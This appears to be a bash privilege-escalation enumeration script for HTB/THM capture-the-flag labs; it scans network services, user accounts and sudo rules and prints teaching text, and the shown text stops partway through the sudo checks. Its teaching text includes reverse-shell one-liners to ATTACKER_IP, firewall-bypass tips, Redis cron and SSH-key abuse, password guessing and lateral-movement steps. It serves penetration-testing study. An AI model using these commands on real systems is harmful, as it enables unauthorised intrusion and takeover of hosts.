#!/bin/bash
# LearnPeas -  Privilege Escalation In-Field Educational Tool
# Comprehensive enumeration + education for HTB/THM environments

set -o pipefail

# === COLORS ===
R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' 
P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
# Critical alert colors (red background + white text)
CRIT='\033[41m\033[1;97m'
# CTF flag alert (purple background + white text)
FLAG='\033[45m\033[1;97m'
# Requires work
WORK='\033[44m\033[1;97m'
# === CONFIGURATION ===
VERBOSE=0
EXPLAIN=1
QUICK_MODE=0
EXTENDED=1
SHOW_FLAGS=0  # ADD THIS LINE
LOG_FILE="/tmp/teachpeas_$(date +%s).log"

# === LOGGING ===
log() { echo -e "$1" | tee -a "$LOG_FILE"; }
section() { log "\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}\n${C}$1${RST}\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }
vuln() { log "${R}[VULNERABLE]${RST} $1"; }
info() { log "${B}[INFO]${RST} $1"; }
ok() { log "${G}[OK]${RST} $1"; }
warn() { log "${Y}[WARNING]${RST} $1"; }
teach() { [ $EXPLAIN -eq 1 ] && log "${Y}[LEARN]${RST} $1"; }
critical() { log "${CRIT}[!!! CRITICAL !!!]${RST} $1"; }
ctf_flag() { log "${FLAG}[🚩 CTF FLAG 🚩]${RST} $1"; }  # ADD THIS LINE

# === EDUCATIONAL FRAMEWORK ===
explain_concept() {
    local title="$1"
    local what="$2"
    local why="$3"
    local how="$4"
    
    [ $EXPLAIN -eq 0 ] && return
    
    log "\n${P}╔═══════════════════════════════════════╗${RST}"
    log "${P}║  UNDERSTANDING: $title"
    log "${P}╚═══════════════════════════════════════${RST}"
    log "${W}WHAT:${RST} $what"
    log "${W}WHY IT MATTERS:${RST} $why"
    log "${W}HOW TO EXPLOIT:${RST} $how"
    log ""
}

# === SYSTEM FINGERPRINT ===
enum_system() {
    section "SYSTEM FINGERPRINT"
    
    local os=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown")
    local kernel=$(uname -r)
    local arch=$(uname -m)
    local hostname=$(hostname)
    
    info "OS: $os"
    info "Kernel: $kernel"
    info "Architecture: $arch"
    info "Hostname: $hostname"
    info "Current User: $(whoami)"
    info "User ID: $(id)"
    
    teach "System fingerprinting reveals:"
    teach "  • Kernel version → CVE lookup on exploit-db"
    teach "  • OS distribution → Default package configurations"
    teach "  • Architecture → Binary compatibility (x86_64, i386, ARM)"
    teach "  • User groups → Special privileges (docker, lxd, disk, etc.)"
}

# === ENHANCED NETWORK ENUMERATION ===
enum_network() {
    section "NETWORK CONFIGURATION"
    
    local found_localhost_services=0
    local found_internal_networks=0
    local found_firewall_restrictions=0
    local found_arp_hosts=0
    
    # === CHECK 1: Network Interfaces ===
    info "Network interfaces:"
    if command -v ip >/dev/null 2>&1; then
        ip addr show 2>/dev/null | grep -E "^[0-9]+:|inet " | while read line; do
            log "  $line"
        done
    else
        ifconfig 2>/dev/null | grep -E "^[a-z]|inet " | head -20 | while read line; do
            log "  $line"
        done
    fi
    
    # === CHECK 2: Active Connections with Service Identification ===
    info "Active network connections with service identification:"
    
    if command -v ss >/dev/null 2>&1; then
        # Parse ss output for listening services
        ss -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local proto=$(echo "$line" | awk '{print $1}')
            local local_addr=$(echo "$line" | awk '{print $5}')
            local process=$(echo "$line" | grep -oE 'users:\(\("[^"]*"' | cut -d'"' -f2)
            
            # Extract IP and port
            local ip=$(echo "$local_addr" | rev | cut -d: -f2- | rev)
            local port=$(echo "$local_addr" | rev | cut -d: -f1 | rev)
            
            # Identify service type and context
            local service_name=""
            local risk_level=""
            local exploitation=""
            
            case "$port" in
                22)
                    service_name="SSH"
                    risk_level="info"
                    ;;
                80|8080|8000)
                    service_name="HTTP Web Server"
                    risk_level="info"
                    ;;
                443|8443)
                    service_name="HTTPS Web Server"
                    risk_level="info"
                    ;;
                3306)
                    service_name="MySQL/MariaDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Likely no auth required - access after gaining shell"
                        found_localhost_services=1
                    else
                        risk_level="info"
                        exploitation="Try default credentials: root:root, root:password"
                    fi
                    ;;
                5432)
                    service_name="PostgreSQL"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Localhost only - likely passwordless trust authentication"
                        found_localhost_services=1
                    fi
                    ;;
                6379)
                    service_name="Redis"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="critical"
                        exploitation="Redis on localhost - usually NO AUTH! Write cron jobs or SSH keys"
                        found_localhost_services=1
                    else
                        risk_level="warn"
                        exploitation="Try: redis-cli -h $ip ping"
                    fi
                    ;;
                9200|9300)
                    service_name="Elasticsearch"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Elasticsearch on localhost - no auth by default"
                        found_localhost_services=1
                    else
                        risk_level="warn"
                        exploitation="Check: curl http://$ip:9200/_cat/indices"
                    fi
                    ;;
                11211)
                    service_name="Memcached"
                    risk_level="warn"
                    exploitation="No authentication - read cached session data"
                    found_localhost_services=1
                    ;;
                27017)
                    service_name="MongoDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="MongoDB on localhost - often no auth"
                        found_localhost_services=1
                    fi
                    ;;
                5672|15672)
                    service_name="RabbitMQ"
                    risk_level="info"
                    exploitation="Default creds: guest:guest (only works from localhost)"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        found_localhost_services=1
                    fi
                    ;;
                8009)
                    service_name="Apache Tomcat AJP"
                    risk_level="warn"
                    exploitation="Check for Ghostcat vulnerability (CVE-2020-1938)"
                    ;;
                *)
                    service_name="Unknown"
                    risk_level="info"
                    ;;
            esac
            
            # Output based on risk level
            if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                # Localhost-only service
                case "$risk_level" in
                    critical)
                        critical "LOCALHOST service: $service_name on port $port (Process: $process)"
                        vuln "Service only accessible from localhost: $local_addr"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    warn)
                        warn "LOCALHOST service: $service_name on port $port (Process: $process)"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    *)
                        info "Localhost: $service_name on port $port (Process: $process)"
                        ;;
                esac
                
            elif echo "$ip" | grep -qE "0\.0\.0\.0|::|\*"; then
                # Externally accessible
                if [ "$risk_level" = "critical" ] || [ "$risk_level" = "warn" ]; then
                    warn "EXTERNAL service: $service_name on port $port (Process: $process)"
                    [ -n "$exploitation" ] && teach "  $exploitation"
                else
                    info "External: $service_name on port $port (Process: $process)"
                fi
            else
                # Specific interface
                info "Listening on $ip:$port - $service_name (Process: $process)"
            fi
        done
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local local_addr=$(echo "$line" | awk '{print $4}')
            local process=$(echo "$line" | awk '{print $NF}')
            
            if echo "$local_addr" | grep -qE "127\.0\.0\.1|::1"; then
                warn "LOCALHOST-ONLY service: $local_addr (Process: $process)"
                found_localhost_services=1
            else
                info "Listening: $local_addr (Process: $process)"
            fi
        done
    fi
    
    # === CONDITIONAL EDUCATION: Localhost Services ===
    if [ $found_localhost_services -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  LOCALHOST SERVICES - Why They Matter"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT ARE LOCALHOST SERVICES:"
        teach "  Services bound to 127.0.0.1 (localhost) are only accessible"
        teach "  from the machine itself, not from the network."
        teach ""
        teach "WHY THEY'RE VULNERABLE:"
        teach "  Admins assume 'if it's localhost-only, it's safe' so they:"
        teach "  • Disable authentication (no password needed)"
        teach "  • Use weak/default credentials"
        teach "  • Don't apply security patches"
        teach "  • Enable dangerous features"
        teach ""
        teach "  The thinking: 'Only I can access it, so why secure it?'"
        teach "  The reality: After YOU get a shell, YOU can access it too."
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Get initial shell access (any user, any method)"
        teach "  2. From that shell: curl http://localhost:PORT"
        teach "  3. Service often has no auth or weak auth"
        teach "  4. Exploit service for privilege escalation"
        teach ""
        teach "COMMON LOCALHOST SERVICES:"
        teach "  • MySQL on 127.0.0.1:3306"
        teach "    - Often trusts local connections without password"
        teach "    - Can read/write files if running as root"
        teach ""
        teach "  • Redis on 127.0.0.1:6379"
        teach "    - Usually NO authentication at all"
        teach "    - Can write to filesystem (cron jobs, SSH keys)"
        teach ""
        teach "  • Elasticsearch on 127.0.0.1:9200"
        teach "    - No auth by default"
        teach "    - Can extract sensitive data"
        teach ""
        teach "PORT FORWARDING (Access from Your Machine):"
        teach "  If you want to access localhost service from your computer:"
        teach "  SSH tunnel: ssh -L 8080:localhost:3306 user@target"
        teach "  Then on your machine: mysql -h 127.0.0.1 -P 8080"
        log ""
    fi
    
    # === CHECK 3: Routing Table Analysis ===
    info "Routing table (potential pivot targets):"
    
    if command -v ip >/dev/null 2>&1; then
        ip route 2>/dev/null | while read line; do
            log "  $line"
            
            # Skip VPN interfaces (tun/tap) and default routes for pivot detection
            if echo "$line" | grep -qE "tun|tap|default"; then
                continue
            fi
            
            # Identify internal network routes (but only first occurrence)
            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
                if [ $found_internal_networks -eq 0 ]; then
                    local network=$(echo "$line" | awk '{print $1}')
                    warn "Internal network detected: $network"
                    found_internal_networks=1
                fi
            fi
        done
    else
        route -n 2>/dev/null | tail -n +3 | while read line; do
            log "  $line"
            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
                found_internal_networks=1
            fi
        done
    fi
    
    # === CONDITIONAL EDUCATION: Internal Networks ===
    if [ $found_internal_networks -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  INTERNAL NETWORKS - Lateral Movement Opportunities"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT ARE INTERNAL NETWORKS:"
        teach "  Private IP ranges not routable on the internet:"
        teach "  • 10.0.0.0/8        (10.x.x.x)"
        teach "  • 172.16.0.0/12     (172.16-31.x.x)"
        teach "  • 192.168.0.0/16    (192.168.x.x)"
        teach ""
        teach "WHY THEY MATTER:"
        teach "  These networks contain other machines you can't reach from"
        teach "  the internet. Once you compromise ONE machine in the network,"
        teach "  you can pivot to attack the others."
        teach ""
        teach "  Think of it like breaking into a building:"
        teach "  • External network = outside the building (public internet)"
        teach "  • Internal network = inside the building (private network)"
        teach "  • Once you're inside, you can access other rooms"
        teach ""
        teach "TYPICAL SCENARIO (HTB/Corporate):"
        teach "  [Internet] → [DMZ Server] → [Internal Network]"
        teach "               ↑ You are here"
        teach ""
        teach "  You compromise DMZ server (web server, VPN, etc.)"
        teach "  From there, you can reach internal machines:"
        teach "  • Database servers"
        teach "  • File servers"
        teach "  • Domain controllers"
        teach "  • Employee workstations"
        teach ""
        teach "HOW TO DISCOVER OTHER MACHINES:"
        teach "  1. Ping sweep (fast but noisy):"
        teach "     for i in {1..254}; do"
        teach "       ping -c1 -W1 192.168.1.\$i 2>/dev/null && echo 192.168.1.\$i is up"
        teach "     done"
        teach ""
        teach "  2. Nmap scan (more thorough):"
        teach "     nmap -sn 192.168.1.0/24  # Host discovery"
        teach "     nmap -p- 192.168.1.50    # Port scan specific host"
        teach ""
        teach "  3. ARP scan (very quiet):"
        teach "     arp-scan --local"
        teach ""
        teach "LATERAL MOVEMENT STRATEGY:"
        teach "  1. Discover other hosts (as above)"
        teach "  2. Scan for services"
        teach "  3. Try credentials from current machine"
        teach "  4. Look for SSH keys in /home/*/.ssh/"
        teach "  5. Check for password reuse"
        teach "  6. Pivot to next machine, repeat"
        log ""
    fi
    
    # === CHECK 4: Firewall Rules ===
    info "Checking firewall configuration..."
    
    # iptables
    if command -v iptables >/dev/null 2>&1; then
        if iptables -L -n 2>/dev/null | grep -qE "Chain|target"; then
            info "iptables rules detected"
            
            # Check if we can read the rules
            local rule_count=$(iptables -L -n 2>/dev/null | grep -cE "^ACCEPT|^DROP|^REJECT")
            if [ $rule_count -gt 0 ]; then
                info "Found $rule_count firewall rules"
                
                # Check for common blocks
                if iptables -L OUTPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    warn "Outbound traffic may be filtered - could block reverse shells"
                    found_firewall_restrictions=1
                fi
                
                if iptables -L INPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    info "Inbound filtering detected - may limit bind shells"
                    found_firewall_restrictions=1
                fi
                
                # Check if rules are readable in detail
                if iptables -L -n -v 2>/dev/null | head -20 | grep -q "."; then
                    teach "  View full rules: iptables -L -n -v"
                fi
            else
                ok "iptables installed but no restrictive rules detected"
            fi
        fi
    fi
    
    # nftables
    if command -v nft >/dev/null 2>&1; then
        if nft list tables 2>/dev/null | grep -q "table"; then
            info "nftables is active"
            local table_count=$(nft list tables 2>/dev/null | wc -l)
            warn "Found $table_count nftables - may restrict connections"
            found_firewall_restrictions=1
            teach "  View rules: nft list ruleset"
        fi
    fi
    
    # ufw
    if command -v ufw >/dev/null 2>&1; then
        local ufw_status=$(ufw status 2>/dev/null | head -1)
        if echo "$ufw_status" | grep -qi "active"; then
            warn "UFW firewall is ACTIVE"
            found_firewall_restrictions=1
            teach "  Check rules: ufw status verbose"
        elif echo "$ufw_status" | grep -qi "inactive"; then
            ok "UFW firewall is inactive"
        fi
    fi
    
    # firewalld
    if command -v firewall-cmd >/dev/null 2>&1; then
        if systemctl is-active --quiet firewalld 2>/dev/null; then
            warn "firewalld is ACTIVE"
            found_firewall_restrictions=1
            teach "  Check zones: firewall-cmd --get-active-zones"
            teach "  List rules: firewall-cmd --list-all"
        fi
    fi
    
    # === CONDITIONAL EDUCATION: Firewall Restrictions ===
    if [ $found_firewall_restrictions -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  FIREWALLS - Why Your Reverse Shell Won't Connect"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT FIREWALLS DO:"
        teach "  Block/allow network connections based on rules:"
        teach "  • Source/destination IP addresses"
        teach "  • Port numbers"
        teach "  • Direction (inbound/outbound)"
        teach "  • Protocol (TCP/UDP)"
        teach ""
        teach "WHY THIS AFFECTS YOU:"
        teach "  Your typical reverse shell:"
        teach "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        teach "         ↑"
        teach "  This creates OUTBOUND connection to port 4444"
        teach "  If firewall blocks outbound to port 4444 = shell fails"
        teach ""
        teach "FIREWALL TYPES:"
        teach "  1. iptables (traditional)"
        teach "  2. nftables (modern replacement)"
        teach "  3. ufw (user-friendly wrapper for iptables)"
        teach "  4. firewalld (Red Hat/CentOS)"
        teach ""
        teach "COMMON CONFIGURATIONS:"
        teach "  • Allow outbound 80 (HTTP)"
        teach "  • Allow outbound 443 (HTTPS)"
        teach "  • Allow outbound 53 (DNS)"
        teach "  • Block everything else"
        teach ""
        teach "BYPASS TECHNIQUES:"
        teach ""
        teach "  1. Use allowed ports:"
        teach "     On attacker: nc -lvnp 443"
        teach "     On target: bash -i >& /dev/tcp/ATTACKER/443 0>&1"
        teach ""
        teach "  2. Use DNS tunneling (if DNS allowed):"
        teach "     Tools: iodine, dnscat2"
        teach ""
        teach "  3. Use ICMP (ping) tunneling:"
        teach "     Tools: icmpsh, ptunnel"
        teach ""
        teach "  4. HTTP/HTTPS reverse shells:"
        teach "     Harder to detect/block"
        teach "     Tools: Metasploit http(s) payloads"
        teach ""
        teach "HOW TO TEST:"
        teach "  From compromised machine:"
        teach "  nc -zv ATTACKER_IP 4444    # Test port 4444"
        teach "  nc -zv ATTACKER_IP 443     # Test port 443"
        teach "  nc -zv ATTACKER_IP 80      # Test port 80"
        teach ""
        teach "  Whichever succeeds, use that port for reverse shell"
        log ""
    fi
    
    # === CHECK 5: ARP Cache (Nearby Hosts) ===
    if command -v arp >/dev/null 2>&1; then
        local arp_entries=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
        local host_count=$(echo "$arp_entries" | grep -v "^$" | wc -l)
        
        if [ $host_count -gt 1 ]; then
            info "Found $host_count hosts in ARP cache (lateral movement targets):"
            echo "$arp_entries" | head -10 | while read host; do
                log "  $host"
            done
            found_arp_hosts=1
        fi
    fi
    
    # === CONDITIONAL EDUCATION: ARP Cache ===
    if [ $found_arp_hosts -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  ARP CACHE - Finding Nearby Machines"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT IS ARP:"
        teach "  Address Resolution Protocol maps IP addresses to MAC addresses"
        teach "  on the local network. When machine A talks to machine B:"
        teach "  1. A asks: 'Who has IP 192.168.1.50?' (ARP request)"
        teach "  2. B responds: 'I do, my MAC is aa:bb:cc:dd:ee:ff'"
        teach "  3. A caches this: 192.168.1.50 = aa:bb:cc:dd:ee:ff"
        teach ""
        teach "WHY THE CACHE MATTERS:"
        teach "  The ARP cache shows which machines this host has RECENTLY"
        teach "  communicated with. These are your lateral movement targets."
        teach ""
        teach "WHAT IT TELLS YOU:"
        teach "  • Other machines on same network segment"
        teach "  • Recently active hosts (not old DNS records)"
        teach "  • Machines this host regularly talks to"
        teach ""
        teach "EXPLOITATION:"
        teach "  These hosts are on the same local network, meaning:"
        teach "  • No firewall between you and them (usually)"
        teach "  • Fast network connection"
        teach "  • May trust this machine"
        teach "  • May have shared credentials"
        teach ""
        teach "NEXT STEPS:"
        teach "  1. Port scan these hosts: nmap -sn <IP>"
        teach "  2. Try credentials from current machine"
        teach "  3. Check /home/*/.ssh/ for SSH keys to these hosts"
        teach "  4. Look for config files mentioning these IPs"
        log ""
    fi
    
    # === CHECK 6: Network Namespaces ===
    if [ -d /var/run/netns ] && [ "$(ls -A /var/run/netns 2>/dev/null)" ]; then
        warn "Network namespaces detected - possible container/virtualization"
        ls /var/run/netns 2>/dev/null | while read ns; do
            info "  Namespace: $ns"
        done
        teach "May indicate container environment - check enum_container section"
    fi
    
    # === Summary ===
    log ""
    if [ $found_localhost_services -eq 1 ] || [ $found_internal_networks -eq 1 ] || [ $found_firewall_restrictions -eq 1 ] || [ $found_arp_hosts -eq 1 ]; then
        info "Network enumeration complete - review findings above"
    else
        ok "Network enumeration complete - no significant attack vectors found"
    fi
}
# === USER ENUMERATION ===
enum_users() {
    section "USER ENUMERATION"
    
    # PHASE 1: SILENT SCAN - Collect all findings
    local found_issues=0
    local temp_sudo_members="/tmp/.learnpeas_sudo_$$"
    local temp_unusual_uids="/tmp/.learnpeas_uids_$$"
    local temp_shell_users="/tmp/.learnpeas_shells_$$"
    
    cleanup_user_temps() {
        rm -f "$temp_sudo_members" "$temp_unusual_uids" "$temp_shell_users" 2>/dev/null
    }
    trap cleanup_user_temps RETURN
    
    # Display basic user info (always show this)
    info "Interactive users (UID >= 1000):"
    awk -F: '$3 >= 1000 && $1 != "nobody" {print "  " $1 " (UID: " $3 ")"}' /etc/passwd
    
    info "Users with shells:"
    grep -E "/(bash|sh|zsh|fish)$" /etc/passwd | cut -d: -f1 | while read u; do
        log "  $u"
        echo "$u" >> "$temp_shell_users"
    done
    
    # Check for sudo group members
    if getent group sudo >/dev/null 2>&1; then
        local sudo_members=$(getent group sudo | cut -d: -f4)
        if [ -n "$sudo_members" ]; then
            info "Members of sudo group:"
            echo "$sudo_members" | tr ',' '\n' | while read u; do
                [ -n "$u" ] && log "  $u" && echo "$u" >> "$temp_sudo_members"
            done
        fi
    fi
    
    # Check for unusual UIDs
    awk -F: '$3 >= 0 {print $1 ":" $3 ":" $7}' /etc/passwd | while IFS=: read username uid shell; do
        # Check for non-root UID 0 accounts
        if [ "$uid" = "0" ] && [ "$username" != "root" ]; then
            echo "$username|$uid|root_equivalent" >> "$temp_unusual_uids"
            found_issues=1
        # System UID with shell (suspicious)
        elif [ "$uid" -lt "1000" ] && [ "$uid" -gt "0" ]; then
            if echo "$shell" | grep -qE "/(bash|sh|zsh|fish)$"; then
                echo "$username|$uid|system_with_shell" >> "$temp_unusual_uids"
                found_issues=1
            fi
        fi
    done
    
    # Check for users with empty passwords (if shadow is readable)
    if [ -r /etc/shadow ]; then
        awk -F: '$2 == "" {print $1}' /etc/shadow 2>/dev/null | while read user; do
            # Only flag if it's an interactive account (UID >= 1000) with a shell
            local uid=$(awk -F: -v u="$user" '$1 == u {print $3}' /etc/passwd)
            local shell=$(awk -F: -v u="$user" '$1 == u {print $7}' /etc/passwd)
            if [ -n "$uid" ] && [ "$uid" -ge "1000" ] && echo "$shell" | grep -qE "/(bash|sh|zsh|fish)$"; then
                echo "$user|$uid|empty_password" >> "$temp_unusual_uids"
                found_issues=1
            fi
        done
    fi
    
    # Check for duplicate UIDs
    awk -F: '{print $3}' /etc/passwd | sort | uniq -d | while read dup_uid; do
        local users=$(awk -F: -v uid="$dup_uid" '$3 == uid {print $1}' /etc/passwd | tr '\n' ',')
        if [ "$dup_uid" = "0" ]; then
            echo "duplicate_root|$dup_uid|$users" >> "$temp_unusual_uids"
            found_issues=1
        elif [ "$dup_uid" -ge "1000" ]; then
            echo "duplicate_user|$dup_uid|$users" >> "$temp_unusual_uids"
            found_issues=1
        fi
    done
    
    # PHASE 2: CONDITIONAL EDUCATION (only if issues found)
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  USER ACCOUNT EXPLOITATION - Understanding the Risks"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHY USER ENUMERATION MATTERS:"
        teach "  User accounts reveal:"
        teach "  • Lateral movement targets (other user accounts to compromise)"
        teach "  • Privilege escalation opportunities (sudo group members)"
        teach "  • Misconfigurations (UID 0 non-root accounts, empty passwords)"
        teach "  • Service accounts that may have weak security"
        teach ""
        teach "WHAT NORMAL LOOKS LIKE:"
        teach "  • root: UID 0 (only one)"
        teach "  • System accounts: UID 1-999 (no shell, locked passwords)"
        teach "  • Regular users: UID 1000+ (with shells)"
        teach "  • sudo group: Small number of trusted users"
        teach ""
        teach "ATTACK VECTORS:"
        teach "  1. UID 0 non-root account = instant root access"
        teach "  2. Empty passwords = su to that user with no password"
        teach "  3. Duplicate UIDs = confusing audit trails, privilege confusion"
        teach "  4. System UIDs with shells = unusual, may have weak passwords"
        teach "  5. sudo group members = targets for password cracking"
        log ""
    fi
    
    # PHASE 3: REPORT SPECIFIC FINDINGS
    if [ -f "$temp_unusual_uids" ]; then
        while IFS='|' read -r identifier uid_or_type issue_type additional; do
            case "$issue_type" in
                root_equivalent)
                    critical "NON-ROOT UID 0 ACCOUNT - Instant root access: $identifier"
                    vuln "User '$identifier' has UID 0 (root equivalent)"
                    log ""
                    teach "EXPLOITATION:"
                    teach "  su $identifier"
                    teach "  # If you know the password or it's empty, you get root"
                    teach ""
                    teach "WHY THIS EXISTS:"
                    teach "  Admins sometimes create UID 0 accounts for:"
                    teach "  • 'Backup' root accounts"
                    teach "  • Service accounts that need full root access"
                    teach "  • Laziness (instead of proper sudo configuration)"
                    teach ""
                    teach "THE DANGER:"
                    teach "  ANY process running as this user has full root privileges."
                    teach "  If you can su to this account, you're root."
                    teach "  Multiple UID 0 accounts make auditing impossible."
                    log ""
                    ;;
                    
                system_with_shell)
                    warn "System account with shell: $identifier (UID: $uid_or_type)"
                    log ""
                    teach "WHY THIS IS UNUSUAL:"
                    teach "  System accounts (UID < 1000) typically have /usr/sbin/nologin"
                    teach "  or /bin/false as their shell to prevent login."
                    teach ""
                    teach "WHY IT MATTERS:"
                    teach "  • May have weak or default passwords"
                    teach "  • Often used for services that 'need' shell access"
                    teach "  • Target for password guessing or brute force"
                    teach ""
                    teach "EXPLOITATION APPROACH:"
                    teach "  1. Try common passwords: $identifier, password, admin"
                    teach "  2. Check if password reuse from other accounts"
                    teach "  3. Look for credentials in config files"
                    teach "  4. If you compromise this account, check sudo access"
                    log ""
                    ;;
                    
                empty_password)
                    critical "USER WITH EMPTY PASSWORD: $identifier (UID: $uid_or_type)"
                    vuln "User '$identifier' has no password set"
                    log ""
                    teach "INSTANT EXPLOITATION:"
                    teach "  su $identifier"
                    teach "  # Press Enter when prompted for password (it's empty)"
                    teach "  # You're now logged in as $identifier"
                    teach ""
                    teach "WHY THIS EXISTS:"
                    teach "  • Admin temporarily removed password and forgot to set it"
                    teach "  • Account created with 'passwd -d' (delete password)"
                    teach "  • Migration/import process left password blank"
                    teach ""
                    teach "WHAT TO DO AFTER ACCESS:"
                    teach "  1. Check sudo permissions: sudo -l"
                    teach "  2. Check group memberships: groups"
                    teach "  3. Look in home directory: ls -la ~"
                    teach "  4. Check SSH keys: cat ~/.ssh/id_rsa"
                    log ""
                    ;;
                    
                duplicate_root)
                    critical "DUPLICATE UID 0 ACCOUNTS: $additional"
                    vuln "Multiple accounts share UID 0 (root equivalent)"
                    log ""
                    teach "WHY THIS IS CRITICAL:"
                    teach "  Multiple UID 0 accounts = multiple paths to root."
                    teach "  Each account may have different:"
                    teach "  • Passwords (some might be weaker)"
                    teach "  • SSH keys"
                    teach "  • Authentication methods"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  Try each account separately:"
                    teach "  $(echo "$additional" | tr ',' '\n' | while read acc; do echo "  su $acc"; done)"
                    teach ""
                    teach "  One of them might have:"
                    teach "  • Empty password"
                    teach "  • Weak password"
                    teach "  • SSH key you can find"
                    log ""
                    ;;
                    
                duplicate_user)
                    warn "Duplicate UID for regular users: $additional (UID: $uid_or_type)"
                    log ""
                    teach "WHY THIS IS SUSPICIOUS:"
                    teach "  Multiple usernames sharing the same UID can access"
                    teach "  each other's files. This is unusual and often indicates:"
                    teach "  • Misconfiguration"
                    teach "  • Legacy account management issues"
                    teach "  • Intentional backdoor"
                    teach ""
                    teach "IMPLICATIONS:"
                    teach "  If you compromise one of these accounts, you effectively"
                    teach "  have access to all accounts with the same UID."
                    log ""
                    ;;
            esac
        done < "$temp_unusual_uids"
    fi
    
    # PHASE 4: CLEAN SUMMARY
        log ""
    if [ ! -s "$temp_unusual_uids" ]; then
        ok "No unusual user configurations detected"
    fi
}
# === COMPREHENSIVE SUDO ANALYSIS ===
enum_sudo() {
    section "SUDO PERMISSIONS ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - COLLECT ALL DATA ===
    local sudo_output=$(sudo -l 2>&1)
    local has_sudo=0
    local has_nopasswd=0
    local has_all_all=0
    local has_all_all_nopasswd=0
    local has_env_keep=0
    local has_ld_preload=0
    local has_ld_library_path=0
    local has_setenv=0
    local has_runas_all=0
    local has_passwd_required=0
    local found_exploitable_bins=0
    local found_wildcards=0
    local found_relative_paths=0
    local found_shell_wrappers=0
    local sudo_version=""
    
    # Temporary files for organizing findings
    local temp_bins="/tmp/.learnpeas_sudo_bins_$$"
    local temp_wildcards="/tmp/.learnpeas_sudo_wildcards_$$"
    local temp_relative="/tmp/.learnpeas_sudo_relative_$$"
    local temp_wrappers="/tmp/.learnpeas_sudo_wrappers_$$"
    
    # Cleanup on exit
    cleanup_sudo_temps() {
        rm -f "$temp_bins" "$temp_wildcards" "$temp_relative" "$temp_wrappers" 2>/dev/null
    }
    trap cleanup_sudo_temps RETURN
    
    # Quick exit if no sudo at all
    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect\|may not run sudo\|unknown user"; then
        ok "No sudo access available"
        return
    fi
    
    has_sudo=1
    
    # Get sudo version for vulnerability correlation
    if command -v sudo >/dev/null 2>&1; then
        sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
    fi
    
    # Analyze sudo -l output for various attack vectors
    while IFS= read -r line; do
        # Skip comments and headers
        echo "$line" | grep -qE "^#|^Matching|^User.*may run" && continue
        
        # Check for NOPASSWD
        if echo "$line" | grep -q "NOPASSWD"; then
            has_nopasswd=1
            
            # Extract the command/binary
            local cmd=$(echo "$line" | sed 's/.*NOPASSWD://g' | sed 's/.*) //g' | awk '{print $1}' | tr -d ',')
            
            if [ -n "$cmd" ]; then
                # Check for wildcards
                if echo "$cmd" | grep -q '\*'; then
                    echo "$line" >> "$temp_wildcards"
                    found_wildcards=1
                fi
                
                # Check for relative paths (no leading /)
                if ! echo "$cmd" | grep -q '^/'; then
                    echo "$line|$cmd" >> "$temp_relative"
                    found_relative_paths=1
                fi
                
                # Check if it's a shell wrapper script
                if [ -f "$cmd" ] && [ -x "$cmd" ]; then
                    if head -1 "$cmd" 2>/dev/null | grep -q '^#!.*sh'; then
                        echo "$line|$cmd" >> "$temp_wrappers"
                        found_shell_wrappers=1
                    fi
                fi
                
                echo "$cmd" >> "$temp_bins"
                found_exploitable_bins=1
            fi
        fi
        
        # Check for (ALL:ALL) ALL patterns
        if echo "$line" | grep -qE '\(ALL\s*:?\s*ALL\)\s*ALL'; then
            has_all_all=1
            if echo "$line" | grep -q "NOPASSWD"; then
                has_all_all_nopasswd=1
            else
                has_passwd_required=1
            fi
        fi
        
        # Check for SETENV tag
        if echo "$line" | grep -q "SETENV"; then
            has_setenv=1
        fi
        
        # Check for env_keep
        if echo "$line" | grep -q "env_keep"; then
            has_env_keep=1
            
            echo "$line" | grep -q "LD_PRELOAD" && has_ld_preload=1
